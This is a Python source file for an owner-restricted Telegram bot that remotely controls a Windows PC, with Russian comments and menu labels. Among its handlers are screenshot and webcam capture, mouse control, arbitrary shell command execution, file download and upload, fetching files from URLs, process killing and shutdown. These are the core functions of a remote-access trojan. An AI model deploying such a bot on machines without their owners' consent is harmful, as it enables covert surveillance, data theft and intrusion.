import os
import ctypes
import telebot
from key import *
from logi import *

bot = telebot.TeleBot(BOT_TOKEN)
#проверка овнера
def is_owner(message):
    return message.from_user.id == MY_ID

#QOL функции
def go_back(message):
    bot.send_message(MY_ID, "Вы в главном меню", reply_markup=Keyboards.menu())
    bot.register_next_step_handler(message, handle_menu)

def send_screenshot(message, as_document=False, next_handler=None):
    bot.send_chat_action(MY_ID, "upload_document" if as_document else "upload_photo")
    try:
        Logic.get_screenshot()
        with open("screen_with_mouse.png", "rb") as f:
            if as_document:
                bot.send_document(MY_ID, f)
            else:
                bot.send_photo(MY_ID, f)
        Logic.cleanup_screenshot()
    except Exception as e:
        log("error", "send_screenshot", str(e))
        bot.send_message(MY_ID, "Компьютер заблокирован")
 
    if next_handler:
        bot.register_next_step_handler(message, next_handler)

#менюшка 
@bot.message_handler(content_types=["text"])
def handle_menu(message):
    if not is_owner(message):
        return
    t = message.text
    if t == "Быстрый скриншот":
        send_screenshot(message)
    elif t == "скриншот":
        send_screenshot(message, as_document=True)
    elif t == "Фото вебкамеры":
        bot.send_chat_action(MY_ID, "upload_photo")
        try:
            Logic.get_webcam_photo()
            with open("webcam.png", "rb") as f:
                bot.send_photo(MY_ID, f)
            os.remove("webcam.png")
        except Exception as e:
            log("error", "handle_webcam", str(e))
            bot.send_message(MY_ID, "Вебкамера недоступна")
    elif t == "Управление мышкой":
        bot.send_message(MY_ID, "Управляю мышью ...", reply_markup=Keyboards.mouse())
        bot.register_next_step_handler(message, handle_mouse)
    elif t == "Файлы и процессы":
        bot.send_message(MY_ID, "Открываем файлы ...", reply_markup=Keyboards.files())
        bot.register_next_step_handler(message, handle_files)
    elif t == "Дополнительно":
        bot.send_message(MY_ID, "Дополнительно ...", reply_markup=Keyboards.additionals())
        bot.register_next_step_handler(message, handle_additionals)
    elif t == "уведомления":
        bot.send_message(MY_ID, "Что написать?")
        bot.register_next_step_handler(message, handle_msgbox)
    elif t == "Информация":
        bot.send_message(MY_ID, INFO)
    elif t == "Диспетчер задач":
        bot.send_message(MY_ID, "Открыл Диспетчер", reply_markup=Keyboards.taskmanager())
        bot.register_next_step_handler(message, handle_taskmanager)
    elif t == "Назад":
        go_back(message)

#управление мышью
def handle_mouse(message):
    if not is_owner(message):
        return
    t = message.text
    if t in MOUSE_MOVES:
        x, y = MOUSE_MOVES[t]
        Logic.move_mouse(x * User.curs, y * User.curs)
        send_screenshot(message, next_handler=handle_mouse)
    elif t == "🆗":
        Logic.click_mouse()
        send_screenshot(message, next_handler=handle_mouse)
    elif t == "Указать размах курсора":
        bot.send_message(MY_ID, f"Сейчас размах: {User.curs}px\nВведите новое значение:")
        bot.register_next_step_handler(message, handle_cursor_step)
    elif t == "Назад":
        go_back(message)

#размах движения
def handle_cursor_step(message):
    if not is_owner(message):
        return

    if Logic.is_digit(message.text):
        Logic.set_cursor_step(message.text)
        bot.send_message(MY_ID, f"Размах изменён на {User.curs}px", reply_markup=Keyboards.mouse())
        bot.register_next_step_handler(message, handle_mouse)
    else:
        bot.send_message(MY_ID, "Введите целое число:")
        bot.register_next_step_handler(message, handle_cursor_step)

#блок команд работы с файлами
def handle_files(message):
    if not is_owner(message):
        return
    t = message.text
    if t == "Замочить процесс":
        bot.send_message(MY_ID, "Укажите название процесса:")
        bot.register_next_step_handler(message, handle_kill)
    elif t == "Запустить":
        bot.send_message(MY_ID, "Укажите путь до файла:")
        bot.register_next_step_handler(message, handle_start)
    elif t == "⬇Скачать файл":
        bot.send_message(MY_ID, "Укажите путь до файла:")
        bot.register_next_step_handler(message, handle_download)
    elif t == "⬆Загрузить файл":
        bot.send_message(MY_ID, "Отправьте файл как документ:")
        bot.register_next_step_handler(message, handle_upload)
    elif t == "Загрузить по ссылке":
        bot.send_message(MY_ID, "Укажите прямую ссылку:")
        bot.register_next_step_handler(message, handle_url_step1)
    elif t == "Назад":
        go_back(message)

#закрытие программы
def handle_kill(message):
    if not is_owner(message):
        return
    try:
        Logic.kill_process(message.text)
        bot.send_message(MY_ID, f'Процесс "{message.text}" убит', reply_markup=Keyboards.files())
    except Exception as e:
        log("error", "handle_kill", str(e))
        bot.send_message(MY_ID, "Процесс не найден", reply_markup=Keyboards.files())
    bot.register_next_step_handler(message, handle_files)

#старт файла на пк
def handle_start(message):
    if not is_owner(message):
        return
    try:
        Logic.start_file(message.text)
        bot.send_message(MY_ID, f'Файл "{message.text}" запущен', reply_markup=Keyboards.files())
    except Exception as e:
        log("error", "handle_start", str(e))
        bot.send_message(MY_ID, "Неверный путь к файлу", reply_markup=Keyboards.files())
    bot.register_next_step_handler(message, handle_files)

#скачивание
def handle_download(message):
    if not is_owner(message):
        return
    path = message.text
    if os.path.exists(path):
        bot.send_message(MY_ID, "Загружаю файл...")
        bot.send_chat_action(MY_ID, "upload_document")
        with open(path, "rb") as f:
            bot.send_document(MY_ID, f)
    else:
        log("error", "handle_download", f"Файл не найден: {path}")
        bot.send_message(MY_ID, "Файл не найден", reply_markup=Keyboards.files())
    bot.register_next_step_handler(message, handle_files)

#загрузка
def handle_upload(message):
    if not is_owner(message):
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        file_bytes = bot.download_file(file_info.file_path)
        Logic.upload_file(message.document.file_name, file_bytes)
        bot.send_message(MY_ID, "Файл успешно загружен", reply_markup=Keyboards.files())
    except Exception as e:
        log("error", "handle_upload", str(e))
        bot.send_message(MY_ID, "Ошибка! Отправьте файл как документ", reply_markup=Keyboards.files())
    bot.register_next_step_handler(message, handle_files)

def handle_url_step1(message):
    if not is_owner(message):
        return
    User.urldown = message.text
    bot.send_message(MY_ID, "Укажите путь сохранения:")
    bot.register_next_step_handler(message, handle_url_step2)
def handle_url_step2(message):
    if not is_owner(message):
        return
    try:
        Logic.upload_by_url(User.urldown, message.text)
        bot.send_message(MY_ID, f'Файл сохранён в "{message.text}"', reply_markup=Keyboards.files())
    except Exception as e:
        log("error", "handle_url_step2", str(e))
        bot.send_message(MY_ID, "Неверная ссылка или путь", reply_markup=Keyboards.files())
    bot.register_next_step_handler(message, handle_files)
 
#разные допы
def handle_additionals(message):
    if not is_owner(message):
        return
    t = message.text
    if t == "Перейти по ссылке":
        bot.send_message(MY_ID, "Укажите ссылку:")
        bot.register_next_step_handler(message, handle_open_url)
    elif t == "Выполнить команду":
        bot.send_message(MY_ID, "Укажите команду:")
        bot.register_next_step_handler(message, handle_cmd)
    elif t == "Выключить компьютер":
        bot.send_message(MY_ID, "Выключение...")
        Logic.shutdown()
    elif t == "Перезагрузить компьютер":
        bot.send_message(MY_ID, "Перезагрузка...")
        Logic.reboot()
    elif t == "О компьютере":
        bot.send_message(MY_ID, Logic.get_pc_info(), parse_mode="markdown")
        bot.register_next_step_handler(message, handle_additionals)
    elif t == "Назад":
        go_back(message)

#открытие url
def handle_open_url(message):
    if not is_owner(message):
        return
    try:
        Logic.open_url(message.text)
        bot.send_message(MY_ID, f'Открыта ссылка: {message.text}', reply_markup=Keyboards.additionals())
    except Exception as e:
        log("error", "handle_open_url", str(e))
        bot.send_message(MY_ID, "Неверная ссылка", reply_markup=Keyboards.additionals())
    bot.register_next_step_handler(message, handle_additionals)

#хэнд консоли
def handle_cmd(message):
    if not is_owner(message):
        return
    try:
        Logic.run_cmd(message.text)
        bot.send_message(MY_ID, f'Команда выполнена: {message.text}', reply_markup=Keyboards.additionals())
    except Exception as e:
        log("error", "handle_cmd", str(e))
        bot.send_message(MY_ID, "Ошибка выполнения команды", reply_markup=Keyboards.additionals())
    bot.register_next_step_handler(message, handle_additionals)

#уведомление
def handle_msgbox(message):
    if not is_owner(message):
        return
    try:
        Logic.show_msgbox(message.text)
        bot.send_message(MY_ID, f'Уведомление "{message.text}" закрыто')
    except Exception as e:
        log("error", "handle_msgbox", str(e))
        bot.send_message(MY_ID, "Ошибка при отображении уведомления")

#диспетчер задач
def handle_taskmanager(message):
    if not is_owner(message):
        return
    t = message.text
    if t == "Все процессы":
        bot.send_chat_action(MY_ID, "typing")
        chunks = TaskManager.get_all_processes()
        for chunk in chunks:
            bot.send_message(MY_ID, chunk, parse_mode="html")
        bot.register_next_step_handler(message, handle_taskmanager)
    elif t == "Топ по CPU":
        bot.send_chat_action(MY_ID, "typing")
        bot.send_message(MY_ID, TaskManager.get_top_cpu(), parse_mode="html")
        bot.register_next_step_handler(message, handle_taskmanager)
    elif t == "Топ по RAM":
        bot.send_chat_action(MY_ID, "typing")
        bot.send_message(MY_ID, TaskManager.get_top_ram(), parse_mode="html")
        bot.register_next_step_handler(message, handle_taskmanager)
    elif t == "Состояние системы":
        bot.send_chat_action(MY_ID, "typing")
        bot.send_message(MY_ID, TaskManager.get_system_stats(), parse_mode="html")
        bot.register_next_step_handler(message, handle_taskmanager)
    elif t == "Найти процесс":
        bot.send_message(MY_ID, "Введите имя процесса (или часть имени):")
        bot.register_next_step_handler(message, handle_find_process)
    elif t == "Завершить по PID":
        bot.send_message(MY_ID, "Введите PID процесса:")
        bot.register_next_step_handler(message, handle_kill_pid)
    elif t == "Назад":
        go_back(message)

def handle_find_process(message):
    if not is_owner(message):
        return
    bot.send_chat_action(MY_ID, "typing")
    result = TaskManager.find_process(message.text)
    bot.send_message(MY_ID, result, parse_mode="html", reply_markup=Keyboards.taskmanager())
    bot.register_next_step_handler(message, handle_taskmanager)

#убийство по pid
def handle_kill_pid(message):
    if not is_owner(message):
        return
    if not Logic.is_digit(message.text):
        bot.send_message(MY_ID, "PID должен быть числом. Введите ещё раз:")
        bot.register_next_step_handler(message, handle_kill_pid)
        return
    result = TaskManager.kill_by_pid(message.text)
    bot.send_message(MY_ID, result, reply_markup=Keyboards.taskmanager())
    bot.register_next_step_handler(message, handle_taskmanager)

#запуск ботика
if __name__ == "__main__":
    init_db()
    bot.send_message(MY_ID, "ПК запущен ✅", reply_markup=Keyboards.menu())
    log("success", "main", "Бот запущен")
 
    bot.polling(none_stop=True, interval=0, timeout=20)
